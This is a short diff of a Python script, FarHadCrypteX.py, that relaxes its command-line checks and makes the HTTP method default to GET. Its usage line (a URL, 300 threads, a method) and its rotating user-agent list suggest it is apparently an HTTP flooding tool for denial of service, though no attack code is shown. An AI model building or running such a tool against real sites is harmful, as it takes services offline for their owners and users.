@@ -23,14 +23,14 @@ print(Fore.CYAN + '''
 ''')
 
 # আর্গুমেন্ট চেক
-if len(sys.argv) != 4:
-    print(Fore.YELLOW + "Usage: python3 FarHadCrypteX.py <url> <threads> <method>")
+if len(sys.argv) < 3:
+    print(Fore.YELLOW + "Usage: python3 FarHadCrypteX.py <url> <threads> [method]")
     print(Fore.YELLOW + "Example: python3 FarHadCrypteX.py https://example.com 300 GET")
     sys.exit()
 
 url = sys.argv[1]
 threads = int(sys.argv[2])
-method = sys.argv[3].upper()
+method = sys.argv[3].upper() if len(sys.argv) > 3 else "GET"
 
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
